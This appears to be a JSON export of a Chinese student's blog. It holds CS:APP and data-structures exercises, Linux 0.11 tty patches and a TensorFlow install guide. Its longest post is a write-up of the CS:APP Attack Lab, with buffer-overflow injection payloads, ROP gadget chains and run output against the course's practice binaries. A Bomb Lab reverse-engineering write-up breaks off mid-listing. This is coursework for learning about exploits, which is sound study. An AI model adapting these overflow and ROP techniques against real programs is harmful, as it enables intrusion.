{"pages":[{"title":"categories","text":"","link":"/categories/index.html"},{"title":"about","text":"博客用尽一生，活成一个平凡人。","link":"/about/index.html"},{"title":"tags","text":"","link":"/tags/index.html"}],"posts":[{"title":"CS:APP解题记录","text":"CS:APP 2.60 12345678910111213#include &lt;stdio.h&gt;unsigned replace_byte(unsigned x, int i, unsigned char b){ x = x &amp; (~(0XFF &lt;&lt; (i &lt;&lt; 3)));//相应字节置零 x = x | (b &lt;&lt; (i &lt;&lt; 3)); //相应字节改为char b return x;}int main(){ unsigned ret = replace_byte(0X12345678, 1, 0XAB); printf(\"0X%X\\n\", ret); return 0;} 0X1234AB78 利用按位运算$x \\&amp; 1 = x$, $b | 0 = b$。 Csapp 2.6512345678910111213141516#include &lt;stdio.h&gt;int odd_ones(unsigned x){ x ^= x &gt;&gt; 16; x ^= x &gt;&gt; 8; x ^= x &gt;&gt; 4; x ^= x &gt;&gt; 2; x ^= x &gt;&gt; 1; return x &amp; 1;}int main(){ int x = odd_ones(0XB); printf(\"%d\\n\", x); return 0;} 1 对32位编码，1亦或所有0仍为1，偶数个1连续亦或结果为0，奇数个1连续亦或结果为1。对32位数，按照右移16，8，4，2，1依次右移使得前后各二分之一编码对齐，亦或结果存在后二分之一编码中，直至亦或总结过存于最低位中，结束，取最低位返回。 Csapp 2.67A.在int为w位的机器中，移位长度不应该超过$w - 1$。B1234567891011#include &lt;stdio.h&gt;#include &lt;limits.h&gt;int int_size_is_32(){ return 1 &lt;&lt; 31 == INT_MIN;}int main(){ printf(\"%d\\n\", int_size_is_32()); return 0;} 1 若int为32位,则$1 &lt;&lt; 31 ==$ INT_MIN. C1234567891011#include &lt;stdio.h&gt;#include &lt;limits.h&gt;int int_size_is_32_for_16(){ return (1 &lt;&lt; 15 != INT_MIN) &amp;&amp; ((1 &lt;&lt; 31) == INT_MIN);}int main(){ printf(\"%d\\n\", int_size_is_32_for_16()); return 0;} 1 当$1 &lt;&lt; 15 !=$ INT_MIN，证明int非16位后，后面即可判断int是否为32位. Csapp 2.6812345678910#include &lt;stdio.h&gt;int lower_one_mask(int n){ return (int)(0XFFFFFFFFu &gt;&gt; (32 - n));}int main(){ printf(\"0X%X\\n\", lower_one_mask(6)); return 0;} 0X3F 将无符号int最大值右移$(32 - n)$位，进行了逻辑右移，再强制转换为有符号int。","link":"/2018/11/08/CS:APP解题记录/"},{"title":"DS_exp2","text":"设计思路 图编号如图所示，从上到下，从左到右，给17个顶点进行编号，以两个顶点代表一条边，例入2-3代表可以从顶点2走到顶点3。问题即为求解从2 -&gt; 17的通路。 求解思想求解一条通路，应当从起点出发，不断前进到后续可行顶点，当在一个顶点无法继续前进时，则回退到上一个顶点，寻找其他可行顶点，直到到达终点。此思想符合数据结构栈的特点。首先将起点压栈，然后将从当前顶点可到达的一个顶点压栈，然后将该顶点标记为已访问，随后到达下一个顶点，在某个顶点无法继续走通时，将当前顶点出栈，回退到上一个顶点重新选择可以到达的且未访问的顶点。如此循环，直到终点被压入栈中，此时栈中所有顶点即为一条通路。 求解一条最短路径，应当从起点出发，访问所有可以到达的下一级顶点。再从所有下一级顶点出发，访问所有可访问的再下一级顶点，如此循环，每一级顶点距起点距离相同。过程中记录路线。此想法符合数据结构中队列的特点。首先，将起点入队。然后将队头元素出队，将该元素可访问到的且未被访问的顶点置为已访问，然后入队，注意记录被入队节点的前一个节点。直到队列为空。最后顺着终点的前驱顶点输出即可得到路线。若有多个终点，要寻找到最近的终点出去，则将结束循环条件改为有终点入队即可。 代码说明结构体及全局变量定义123456789101112131415typedef struct p //表示顶点,用于寻找最短路径时记录路径{ int code; struct p* pre; //前一个顶点} Ver;const int edge_cnt = 29; //边的数量const int ver_cnt = 17; //顶点数量int map[edge_cnt][2]; //记录边int my_stack[MAX] = {0}; //数组模拟栈int my_quque[MAX] = {0}; //数组模拟队列int top = 0; //栈顶指示int front = 0, rear = 0; //队列首位指示bool visit[ver_cnt + 1] = {false}; //记录点是否访问过Ver vers[ver_cnt + 1]; //每个点路径链表头结点 函数定义123456void loadmaze(); //读入迷宫地图void visited(int i); //将点i状态置为访问过bool isvisited(int i); //判断点i是否访问过bool hasway(int s); //从点s出发是否有没去过的可行路径void find_way(int start, int end); //找到一条通路void find_least(int start, int end); //找到一条最短路径 运行结果 实验总结本次实验，求解迷宫通路和最短通路，在不利用递归的情况下，使用模拟的栈和队列，实现了深度优先搜索和广度优先搜索。加强了对于栈和队列的理解以及使用熟练度。","link":"/2018/11/10/DS_exp2/"},{"title":"DS_exp3","text":"设计思路 BM算法是一种后缀匹配算法,其具有比KMP算法更优秀的性能表现.其核心思想有二,第一是坏字符,坏字符就是pattern与text从右往左第一失配的在text中的字符,二是好后缀,好后缀就是pattern与text从右往左连续匹配成功的子串.对于坏字符和好后缀,有各自的模式串移动规则,可以确定各自失配时需要移动的位数,最终选择二者中移动位数较大者移动.在主函数中,让用户输入文档名与需要查找的单词.每次从文档中读取一行进行匹配搜索,每次使用BM算法搜索完成后,若搜索到单词,则将主串中开始匹配的位置定为查找到单词的下一行,使用BM算法进行下一个匹配搜索,直至搜索完当前行.而后循环直至匹配完整个文档. 代码说明1int* CreateBC(char* pattern, int len); 传入模式串及其长度,返回根据坏字符的跳转数组.12int* CreateSuffix(char* pattern, int len);int* CreateGS(char* pattern, int len); 两个函数都需要传入模式串及其长度,第一个函数返回其后缀数组,第二个函数调用第一个函数返回根据好后缀的跳转数组.1int bm_search(char* text, int text_len, char* pattern, int pattern_len, int *bc, int *gs); 传入主串及其长度,模式串及其长度,坏字符跳转数组,好后缀跳转数组.返回在主串中查找到模式串的第一个位置,未查找到,则返回-1.1char* get_line(FILE *article, char (&amp;text)[1000]); 从给定的article文件中读取最大1000字符的一行,存在text位置,读取到文件末尾则返回NULL. 运行结果 此为从马丁路德金的I hava a dream演讲稿中查找dream得出的结果.","link":"/2018/12/01/DS_exp3/"},{"title":"DS_work2","text":"代码 1234567891011121314151617181920212223242526272829void GList_copy(GList L, GList &amp;N){ //非空表则进入 if(L) { N = new GLNode; if(!N) //未分配空间 { exit(OVERFLOW); } N-&gt;tag = L-&gt;tag; //复制标志位 if(L-&gt;tag==ATOM) //如果是原子 { N-&gt;atom = L-&gt;atom; } else //复制表头 { GList_copy(L-&gt;hp, N-&gt;hp); } if(!(L-&gt;tp)) //表尾为空，则递归完表 { N-&gt;tp=NULL; } else //复制表尾 { GList_copy(L-&gt;tp, N-&gt;tp); } }}","link":"/2018/11/16/DS_work2/"},{"title":"Python数据清洗初步","text":"简介 XML是一种可扩展标记语言，被用来传输和存储数据。它是一种有逻辑的树结构。 Python使用xml.ElementTree解析123import xml.etree.ElementTree as ETimport codecsimport json codecs用于打开文件，json用于保存清洗完的数据。 123tree = ET.parse() #获取目录树root = tree.getroot() #得到树根 root = ET.fromstring() #从字符串直接解析出树根 获取树根，然后进行操作 123456789101112131415root.tag #root元素的标记名root.attrib #root元素的属性，为一个dicfor child in root: #便利子元素 print(child.tag, child.attrib)root[0][1].text #将元素视为多维数组,用下标访问root.find(\"element\").text #找出root下element下的内容字符串title = root.get(\"Title\") #获取root元素的title属性for neighbor in root.iter('neighbor'): #遍历所有特定元素,递归到所有，子、孙...元素 print(neighbor.attrib)for country in root.findall('country'): #找出所有country元素，仅子代 rank = country.find('rank').text name = country.get('name') print(name, rank)for country in root.find('country'): #仅找出第一个符合的子代 其他涉及知识123456789import osdef mkdir(path): #创建文件夹 if not os.path.exists(path): os.mkdir(path) for son_path in os.listdir(root_path): #遍历root_path下的文件 json.dump(dic, file_obj, ensure_ascii=False, indent=4, separators=(',', ': ')) #将字典dic输出到文件file_obj中,不对ascii进行编码,缩进4,分隔符为','以及': ' 暂时到此","link":"/2018/12/09/Python数据清洗初步/"},{"title":"I/O_lab","text":"实验步骤 本次试验中，主要涉及keyboard.S，tty_io.c，console.c。其中：keyboard.S主要实现键盘中断处理过程，当按下键盘时，出发中断，由对应函数进行处理，并将字符放入read_q写队列中；tty_io.c包含tty字符设备读函数tty_read()和tty_write()，为文件系统提供了上层访问接口，copy_to_cooked()将输入字符处理后添加到tty辅助队列secondary中，若开启了回显功能，则还会将其添加到write_q写队列中，由console.c中的con_write()函数中写入到终端。 phase1此关要求将f12作为一个开关，用于启用/关闭*模式，我们需要加一个全局变量用以标示是否开启改模式。首先需要对keyboard.S进行改动，使按下f12时执行正确的中断调用。我们可以见得，functions按键由func函数进行处理，当检测到按下的为f12时，调用change_f12Flag()函数更改标志变量f12Flag。 我们在f12中声明f12Flag，并且将该函数放置在其中，供keyboard.S调用处理按下f12的情况。 并且在console.c中引入外部变量f12Flag，对输出加以更改。当f12Flag非0时，将姓名拼音首位字母变为*。 至此，修改完成，我们make生成image之后，运行./run脚本，开启boch虚拟机。 运行正确。 phase2此阶段，和phase1相似，只是将开启/关闭条件改为了学号/学号-。那么我们在tty_io.c中加入一个有限状态自动机即可，copy_to_cooked()会将输入字符加入到tty辅助队列和tty写入队列，我们状态机代码放在此处,，以变量leng_fit表示状态，根据输入字符更改状态。 然后我们在console.c中引入外部变量leng_fit，当leng_fit为10时，改变输出。 我们make后运行。 成功。 制作补丁为了方便保存更改后的代码，我们使用diff指令制作补丁，方便以后使用patch恢复。 生成补丁如下。 phase1.patch 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152diff -ru linux-0.11-bk/kernel/chr_drv/console.c linux-0.11/kernel/chr_drv/console.c--- linux-0.11-bk/kernel/chr_drv/console.c 2008-08-28 13:14:58.000000000 +0800+++ linux-0.11/kernel/chr_drv/console.c 2018-12-28 22:25:05.249893925 +0800@@ -54,7 +54,7 @@ #define NPAR 16 extern void keyboard_interrupt(void);-+extern unsigned char f12Flag; static unsigned char video_type; /* Type of display being used */ static unsigned long video_num_columns; /* Number of text columns */ static unsigned long video_size_row; /* Bytes per row */@@ -450,6 +450,8 @@ nr = CHARS(tty-&gt;write_q); while (nr--) { GETCH(tty-&gt;write_q,c);+ if(f12Flag &amp;&amp; (c == 'w' || c == 'o'))+ c = '*'; switch(state) { case 0: if (c&gt;31 &amp;&amp; c&lt;127) {diff -ru linux-0.11-bk/kernel/chr_drv/keyboard.S linux-0.11/kernel/chr_drv/keyboard.S--- linux-0.11-bk/kernel/chr_drv/keyboard.S 2008-08-28 13:14:58.000000000 +0800+++ linux-0.11/kernel/chr_drv/keyboard.S 2018-12-28 22:25:05.249893925 +0800@@ -224,6 +224,7 @@ jb end_func cmpb $11,%al ja end_func+ call change_f12Flag ok_func: cmpl $4,%ecx /* check that there is enough room */ jl end_funcdiff -ru linux-0.11-bk/kernel/chr_drv/tty_io.c linux-0.11/kernel/chr_drv/tty_io.c--- linux-0.11-bk/kernel/chr_drv/tty_io.c 2008-08-28 13:14:58.000000000 +0800+++ linux-0.11/kernel/chr_drv/tty_io.c 2018-12-28 22:25:05.249893925 +0800@@ -47,7 +47,7 @@ #define O_CRNL(tty) _O_FLAG((tty),OCRNL) #define O_NLRET(tty) _O_FLAG((tty),ONLRET) #define O_LCUC(tty) _O_FLAG((tty),OLCUC)-+unsigned char f12Flag; struct tty_struct tty_table[] = { { {ICRNL, /* change incoming CR to NL */@@ -348,3 +348,7 @@ void chr_dev_init(void) { }+void change_f12Flag(void)+{+ f12Flag = ~f12Flag;+} phase2.patch 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108diff -ru linux-0.11-bk/kernel/chr_drv/console.c linux-0.11/kernel/chr_drv/console.c--- linux-0.11-bk/kernel/chr_drv/console.c 2008-08-28 13:14:58.000000000 +0800+++ linux-0.11/kernel/chr_drv/console.c 2018-12-28 18:23:00.272667952 +0800@@ -54,6 +54,7 @@ #define NPAR 16 extern void keyboard_interrupt(void);+extern unsigned int leng_fit; static unsigned char video_type; /* Type of display being used */ static unsigned long video_num_columns; /* Number of text columns */@@ -448,8 +449,13 @@ char c; nr = CHARS(tty-&gt;write_q);+ + while (nr--) { GETCH(tty-&gt;write_q,c);+ + if((c == 119 || c == 111) &amp;&amp; leng_fit == 10)+ c = '*'; switch(state) { case 0: if (c&gt;31 &amp;&amp; c&lt;127) {diff -ru linux-0.11-bk/kernel/chr_drv/tty_io.c linux-0.11/kernel/chr_drv/tty_io.c--- linux-0.11-bk/kernel/chr_drv/tty_io.c 2008-08-28 13:14:58.000000000 +0800+++ linux-0.11/kernel/chr_drv/tty_io.c 2018-12-28 18:22:43.084621806 +0800@@ -47,7 +47,7 @@ #define O_CRNL(tty) _O_FLAG((tty),OCRNL) #define O_NLRET(tty) _O_FLAG((tty),ONLRET) #define O_LCUC(tty) _O_FLAG((tty),OLCUC)-+unsigned int leng_fit = 0; struct tty_struct tty_table[] = { { {ICRNL, /* change incoming CR to NL */@@ -148,6 +148,70 @@ while (!EMPTY(tty-&gt;read_q) &amp;&amp; !FULL(tty-&gt;secondary)) { GETCH(tty-&gt;read_q,c);+ switch(leng_fit){+ case 0:+ if(c == 50)+ leng_fit++;+ break;+ case 1:+ if(c == 48)+ leng_fit++;+ else+ leng_fit = 0;+ break;+ case 2:+ if(c == 49)+ leng_fit++;+ else+ leng_fit = 0;+ break;+ case 3:+ if(c == 55)+ leng_fit++;+ else+ leng_fit = 0;+ break;+ case 4:+ if(c == 50)+ leng_fit++;+ else+ leng_fit = 0;+ break;+ case 5:+ if(c == 49)+ leng_fit++;+ else+ leng_fit = 0;+ break;+ case 6:+ if(c == 49)+ leng_fit++;+ else+ leng_fit = 0;+ break;+ case 7:+ if(c == 53)+ leng_fit++;+ else+ leng_fit = 0;+ break;+ case 8:+ if(c == 50)+ leng_fit++;+ else+ leng_fit = 0;+ break;+ case 9:+ if(c == 51)+ leng_fit++;+ else+ leng_fit = 0;+ break;+ case 10:+ if(c == 45)+ leng_fit = 0;+ break; + } if (c==13) if (I_CRNL(tty)) c=10;","link":"/2018/12/28/I-O-lab/"},{"title":"Ubuntu18.04安装TensorFlow-gpu","text":"显卡驱动 终端执行1sudo apt install nvidia-driver-390 安装官网有安装所需软件要求 安装cuda及其组件注意，一定不要更新使用TensorFlow官方教程一把梭 12345678910111213141516# Add NVIDIA package repositorysudo apt-key adv --fetch-keys http://developer.download.nvidia.com/compute/cuda/repos/ubuntu1604/x86_64/7fa2af80.pubwget http://developer.download.nvidia.com/compute/cuda/repos/ubuntu1604/x86_64/cuda-repo-ubuntu1604_9.1.85-1_amd64.debsudo apt install ./cuda-repo-ubuntu1604_9.1.85-1_amd64.debwget http://developer.download.nvidia.com/compute/machine-learning/repos/ubuntu1604/x86_64/nvidia-machine-learning-repo-ubuntu1604_1.0.0-1_amd64.debsudo apt install ./nvidia-machine-learning-repo-ubuntu1604_1.0.0-1_amd64.debsudo apt update# Install CUDA and tools. Include optional NCCL 2.xsudo apt install cuda9.0 cuda-cublas-9-0 cuda-cufft-9-0 cuda-curand-9-0 \\ cuda-cusolver-9-0 cuda-cusparse-9-0 libcudnn7=7.2.1.38-1+cuda9.0 \\ libnccl2=2.2.13-1+cuda9.0 cuda-command-line-tools-9-0# Optional: Install the TensorRT runtime (must be after CUDA install)sudo apt updatesudo apt install libnvinfer4=4.1.2-1+cuda9.0 注意不要重复安装nvidia显卡驱动。然后设置环境变量12export PATH=/usr/local/cuda-9.0/bin/:$PATHexport LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/usr/local/cuda-9.0/extras/CUPTI/lib64 检验下安装12345wmc@OMEN:~$ nvcc -Vnvcc: NVIDIA (R) Cuda compiler driverCopyright (c) 2005-2017 NVIDIA CorporationBuilt on Fri_Sep__1_21:08:03_CDT_2017Cuda compilation tools, release 9.0, V9.0.176 AnacondaAnaconda安装十分简单。安装完成后，我们使用创建一个新的python虚拟环境，安装tensorflow-gpu.123conda create -n tensor pip python=3.6source activate tensorpip install --upgrade tensorflow-gpu 然后使用示例程序来测试一下.123456789101112131415161718import tensorflow as tfmnist = tf.keras.datasets.mnist(x_train, y_train),(x_test, y_test) = mnist.load_data()x_train, x_test = x_train / 255.0, x_test / 255.0model = tf.keras.models.Sequential([ tf.keras.layers.Flatten(), tf.keras.layers.Dense(512, activation=tf.nn.relu), tf.keras.layers.Dropout(0.2), tf.keras.layers.Dense(10, activation=tf.nn.softmax)])model.compile(optimizer='adam', loss='sparse_categorical_crossentropy', metrics=['accuracy'])model.fit(x_train, y_train, epochs=5)model.evaluate(x_test, y_test) 查看下，运行时gpu显存飙升，占用率升到50%，确实是启用了tensorflow-gpu. jupyter支持conda虚拟环境内核123conda activate tensorflowenvpip install ipykernelpython -m ipykernel install --user --name tensorflowenv --display-name \"Python (tensorflowenv)\" 安装插件12conda install -c conda-forge jupyter_contrib_nbextensionsjupyter contrib nbextension install --user","link":"/2019/02/01/Ubuntu18-04安装TensorFlow-gpu/"},{"title":"Attack_lab","text":"实验描述 本次实验利用程序需要外部输入的特点，输入机器码对程序返回值覆盖，以达到攻击的目的，即在getbuf函数需要的输入中做手脚，以致不能正常返回，执行攻击代码。 第一阶段第一阶段中栈随机化未开机，可以得知内存位置的确切地址，且栈中机器码可执行。 那么我们将需要执行的操作码和地址输入机器码即可。 phase_1第一关非常简单，题目主要我们在getbuf执行完成后执行touch1,touch1()无参。 1234567891011121314151617181920(gdb) disas getbuf Dump of assembler code for function getbuf: 0x0000000000401688 &lt;+0&gt;: sub $0x18,%rsp 0x000000000040168c &lt;+4&gt;: mov %rsp,%rdi 0x000000000040168f &lt;+7&gt;: callq 0x4018ca &lt;Gets&gt; 0x0000000000401694 &lt;+12&gt;: mov $0x1,%eax 0x0000000000401699 &lt;+17&gt;: add $0x18,%rsp 0x000000000040169d &lt;+21&gt;: retq End of assembler dump.(gdb) disas touch1Dump of assembler code for function touch1: 0x00000000004016a0 &lt;+0&gt;: sub $0x8,%rsp 0x00000000004016a4 &lt;+4&gt;: movl $0x1,0x2029ee(%rip) # 0x60409c &lt;vlevel&gt; 0x00000000004016ae &lt;+14&gt;: mov $0x402e4e,%edi 0x00000000004016b3 &lt;+19&gt;: callq 0x400bd0 &lt;puts@plt&gt; 0x00000000004016b8 &lt;+24&gt;: mov $0x1,%edi 0x00000000004016bd &lt;+29&gt;: callq 0x401ab5 &lt;validate&gt; 0x00000000004016c2 &lt;+34&gt;: mov $0x0,%edi 0x00000000004016c7 &lt;+39&gt;: callq 0x400d60 &lt;exit@plt&gt;End of assembler dump. 可以看到，getbuf开出了0x18，即24字节的空间，touch1的地址为0x4016a0。那么我们只需填满这0x28空间，再以touch1地址替代返回值。注意：x86-64机器中，采用小端法，其低位字节存放在低地址，故我们输入数据时，先输入低位。 123400 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00a0 16 40 00 00 00 00 00 转换后输入即可 12345678Cookie: 0x63149380Type string:Touch1!: You called touch1()Valid solution for level 1 with target ctargetPASS: Would have posted the following: user id 2017211523 course f18 lab attacklab result 117:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 A0 16 40 00 00 00 00 00 phase_2第二关根据题意，需要调用touch2，需要传递一个无符号整数值，其值为cookie，查看cookie文件，如下。 122017211523@bupt3:~/target117$ cat cookie.txt 0x63149380 为了给touch2传参，我们需要将cookie值赋给%rdi，然后将touch2地址压栈，使用ret弹出touch2地址返回，调用touch2。 123mov $0x63149380,%rdipushq $0x4016ccret 将其编译为二进制之后在反汇编，得到如下，由此我们便知指令的机器码是多少。 123456789phase2.o: file format elf64-x86-64Disassembly of section .text:0000000000000000 &lt;.text&gt;: 0: 48 c7 c7 80 93 14 63 mov $0x63149380,%rdi 7: 68 cc 16 40 00 pushq $0x4016cc c: c3 retq 我们将指令的机器码放在getbuf时的栈顶，然后将返回值位置设置为栈顶地址，这样既可达到目的，调用getbuf时栈顶地址为0x5566f7a8。 123448 c7 c7 80 93 14 63 68cc 16 40 00 c3 00 00 0000 00 00 00 00 00 00 00a8 f7 66 55 00 00 00 00 输入运行。 1234567892017211523@bupt3:~/target117$ ./hex2raw &lt; phase2 | ./ctarget -qCookie: 0x63149380Type string:Touch2!: You called touch2(0x63149380)Valid solution for level 2 with target ctargetPASS: Would have posted the following: user id 2017211523 course f18 lab attacklab result 117:PASS:0xffffffff:ctarget:2:48 C7 C7 80 93 14 63 68 CC 16 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 A8 F7 66 55 00 00 00 00 phase_3查看touch3 123456789101112void touch3(char *sval){ vlevel = 3; /* Part of validation protocol */ if (hexmatch(cookie, sval)) { printf(\"Touch3!: You called touch3(\\\"%s\\\")\\n\", sval); validate(3);} else { printf(\"Misfire: You called touch3(\\\"%s\\\")\\n\", sval); fail(3);} exit(0);} 可知其需要一个指向字符的指针sval，然后调用hexmatch，将cookie和sval作为参数传入，需要hexomatch返回非零值。 12345678int hexmatch(unsigned val, char *sval){ char cbuf[110]; /* Make position of check string unpredictable */ char *s = cbuf + random() % 100; sprintf(s, \"%.8x\", val); return strncmp(sval, s, 9) == 0;} 由hexmatch可知，其比较cookie的字符串表示与传入的字符串是否相等，相等则返回1，那么问题明了，我们需要将表示cookie的字符串地址传给touch3，与第二题不同的是字符串需要有空间保存，我们需要在栈中找出调用hexmatch时候未被重写改变的空间，借以保存字符串。 123mov $0x5566f7c8,%rdipushq $0x4017a0ret 这里我们将cookie的字符串表示放在0x5566f7c8，编译再反汇编得到机器码 123456789phase3.o: file format elf64-x86-64Disassembly of section .text:0000000000000000 &lt;.text&gt;: 0: 48 c7 c7 c8 f7 66 55 mov $0x5566f7c8,%rdi 7: 68 a0 17 40 00 pushq $0x4017a0 c: c3 retq 查表得出cookie字符串的16进制表示为36 33 31 34 39 33 38 30，注意：以字符串形势比较时不用再反转输入，且字符串应有结尾字符‘\\0’，得到攻击字符串如下 12345648 c7 c7 c8 f7 66 55 68a0 17 40 00 c3 00 00 0000 00 00 00 00 00 00 00a8 f7 66 55 00 00 00 0036 33 31 34 39 33 38 3000 转换输入运行 1234567892017211523@bupt3:~/target117$ ./hex2raw &lt; phase3 | ./ctarget -qCookie: 0x63149380Type string:Touch3!: You called touch3(\"63149380\")Valid solution for level 3 with target ctargetPASS: Would have posted the following: user id 2017211523 course f18 lab attacklab result 117:PASS:0xffffffff:ctarget:3:48 C7 C7 C8 F7 66 55 68 A0 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 A8 F7 66 55 00 00 00 00 36 33 31 34 39 33 38 30 00 第二阶段在此阶段，程序添加了两个现代计算机程序几乎必须的对抗缓缓冲区溢出攻击的措施： 1.函数栈随机化 ，无法再获取绝对地址。 2.栈内存的内容被锁定为不可执行。 故此，我们需要使用ROP(面向返回编程)，即使用程序中本来就存在的代码组成我们需要的操作，再将其地址作为返回值，不断用ret指令返回完成所需操作。 phase_4此关需用ROP方法完成phase_2内容。那么就需要在操作中得到cookie值，那么只有用pop指令了，需要指令为。 123popq %raxmovq %rax,%rdiret 查找官方的write up，得知对应机器码，然后在在rtarget文件的反汇编文件中利用vim查找对应代码地址。将其放入攻击字符串，得到攻击字符串为。 123456700 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 003c 18 40 00 00 00 00 00 /* popq rax */80 93 14 63 00 00 00 00 /* cookie */49 18 40 00 00 00 00 00 /* movq %rax,%rdi */cc 16 40 00 00 00 00 00 /* touch2 */ 转换输入运行 1234562017211523@bupt3:~/target117$ ./hex2raw &lt; phase4 | ./rtarget Cookie: 0x63149380Type string:Touch2!: You called touch2(0x63149380)Valid solution for level 2 with target rtargetPASS: Sent exploit string to server to be validated.NICE JOB! phase_5此关为phase_3的ROP版本，我们需要查找start_farm到end_farm中的gadgets，拼凑出代码实现phase_3中插入代码的功能。还需注意： 1.0x90代表nop，除了将pc加1之外不做任何事。 2.不分双字节指令，设置标志位，不改变寄存器的值，可以使用。 需要的指令有 12345678movq %rsp,%raxmovq %rax,%rdipopq %raxmovl %eax,%ecxmovl %ecx,%edxmovl %edx,%esilea(%rdi, %rsi, 1),%raxmovq %rax,%rdi 则攻击字符串为 12345678910111213141500 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00bd 18 40 00 00 00 00 00 /* gadget1 */49 18 40 00 00 00 00 00 /* gadget2 */30 18 40 00 00 00 00 00 /* gadget3 */48 00 00 00 00 00 00 00 /* cookie字符串偏移量*/13 19 40 00 00 00 00 00 /* gadget4 */ca 18 40 00 00 00 00 00 /* gadget5 */b7 18 40 00 00 00 00 00 /* gadget6 */69 18 40 00 00 00 00 00 /* gadget7 */49 18 40 00 00 00 00 00 /* gadget8 */a0 17 40 00 00 00 00 00 /* touch3地址 */36 33 31 34 39 33 38 30 /* cookie字符串 */00 转换文件运行 1234562017211523@bupt3:~/target117$ ./hex2raw &lt; phase5 | ./rtarget Cookie: 0x63149380Type string:Touch3!: You called touch3(\"63149380\")Valid solution for level 3 with target rtargetPASS: Sent exploit string to server to be validated.NICE JOB! 到此为止","link":"/2018/12/08/Attack-lab/"},{"title":"Bomb_lab","text":"phase_1 - Phase_4 phase_51disas phase_5 生成下面的汇编代码，可见，需要读入一个长度为6的字符串123456789100x0000000000401062 &lt;+0&gt;: push %rbx0x0000000000401063 &lt;+1&gt;: sub $0x20,%rsp0x0000000000401067 &lt;+5&gt;: mov %rdi,%rbx0x000000000040106a &lt;+8&gt;: mov %fs:0x28,%rax0x0000000000401073 &lt;+17&gt;: mov %rax,0x18(%rsp)0x0000000000401078 &lt;+22&gt;: xor %eax,%eax0x000000000040107a &lt;+24&gt;: callq 0x40131b &lt;string_length&gt;0x000000000040107f &lt;+29&gt;: cmp $0x6,%eax0x0000000000401082 &lt;+32&gt;: je 0x4010d2 &lt;phase_5+112&gt;0x0000000000401084 &lt;+34&gt;: callq 0x40143a &lt;explode_bomb&gt; 从下面这段，是一个循环，对输入字符串进行一个变换，得到s.其变换为是s[i] = p[input[i] &amp; 0xf]，p是程序内含的一个模式串.1234567890x000000000040108b &lt;+41&gt;: movzbl (%rbx,%rax,1),%ecx0x000000000040108f &lt;+45&gt;: mov %cl,(%rsp)0x0000000000401092 &lt;+48&gt;: mov (%rsp),%rdx0x0000000000401096 &lt;+52&gt;: and $0xf,%edx0x0000000000401099 &lt;+55&gt;: movzbl 0x4024b0(%rdx),%edx0x00000000004010a0 &lt;+62&gt;: mov %dl,0x10(%rsp,%rax,1)0x00000000004010a4 &lt;+66&gt;: add $0x1,%rax0x00000000004010a8 &lt;+70&gt;: cmp $0x6,%rax0x00000000004010ac &lt;+74&gt;: jne 0x40108b &lt;phase_5+41&gt; 程序中提到了0x4024b0这个地址，由于&amp;0xf意味取取其低4位值，因为模式串长度应为16，我们查看这个串.123(gdb) x /16c 0x4024b00x4024b0 &lt;array.3449&gt;: 109 'm' 97 'a' 100 'd' 117 'u' 105 'i' 101 'e' 114 'r' 115 's'0x4024b8 &lt;array.3449+8&gt;: 110 'n' 102 'f' 111 'o' 116 't' 118 'v' 98 'b' 121 'y' 108 'l' 继续看汇编代码,发现将生成的s与另一个位于0x4025be的字符串进行比较，必须相等.1234560x00000000004010b3 &lt;+81&gt;: mov $0x40245e,%esi0x00000000004010b8 &lt;+86&gt;: lea 0x10(%rsp),%rdi0x00000000004010bd &lt;+91&gt;: callq 0x401338 &lt;strings_not_equal&gt;0x00000000004010c2 &lt;+96&gt;: test %eax,%eax0x00000000004010c4 &lt;+98&gt;: je 0x4010d9 &lt;phase_5+119&gt;0x00000000004010c6 &lt;+100&gt;: callq 0x40143a &lt;explode_bomb&gt; 我们查看另一个串,可指其为flyers.12(gdb) x /6c 0x40245e0x40245e: 102 'f' 108 'l' 121 'y' 101 'e' 114 'r' 115 's' 我们由此反解输入，例如’f’在p中下标为9，低四位1001，查表得低4位位1001的字符又’i’，依次进行，解得一组答案为”ionefg”. phase_6首先还是1disas phase_6 从得出代码可以看出，读入了6个数字，且这6个数字互不相等.1234567891011121314151617181920212223242526272829303132Dump of assembler code for function phase_6:0x00000000004010f4 &lt;+0&gt;: push %r140x00000000004010f6 &lt;+2&gt;: push %r130x00000000004010f8 &lt;+4&gt;: push %r120x00000000004010fa &lt;+6&gt;: push %rbp0x00000000004010fb &lt;+7&gt;: push %rbx0x00000000004010fc &lt;+8&gt;: sub $0x50,%rsp0x0000000000401100 &lt;+12&gt;: mov %rsp,%r130x0000000000401103 &lt;+15&gt;: mov %rsp,%rsi0x0000000000401106 &lt;+18&gt;: callq 0x40145c &lt;read_six_numbers&gt;0x000000000040110b &lt;+23&gt;: mov %rsp,%r140x000000000040110e &lt;+26&gt;: mov $0x0,%r12d0x0000000000401114 &lt;+32&gt;: mov %r13,%rbp0x0000000000401117 &lt;+35&gt;: mov 0x0(%r13),%eax0x000000000040111b &lt;+39&gt;: sub $0x1,%eax0x000000000040111e &lt;+42&gt;: cmp $0x5,%eax0x0000000000401121 &lt;+45&gt;: jbe 0x401128 &lt;phase_6+52&gt;0x0000000000401123 &lt;+47&gt;: callq 0x40143a &lt;explode_bomb&gt;0x0000000000401128 &lt;+52&gt;: add $0x1,%r12d0x000000000040112c &lt;+56&gt;: cmp $0x6,%r12d0x0000000000401130 &lt;+60&gt;: je 0x401153 &lt;phase_6+95&gt;0x0000000000401132 &lt;+62&gt;: mov %r12d,%ebx0x0000000000401135 &lt;+65&gt;: movslq %ebx,%rax0x0000000000401138 &lt;+68&gt;: mov (%rsp,%rax,4),%eax0x000000000040113b &lt;+71&gt;: cmp %eax,0x0(%rbp)0x000000000040113e &lt;+74&gt;: jne 0x401145 &lt;phase_6+81&gt;0x0000000000401140 &lt;+76&gt;: callq 0x40143a &lt;explode_bomb&gt;0x0000000000401145 &lt;+81&gt;: add $0x1,%ebx0x0000000000401148 &lt;+84&gt;: cmp 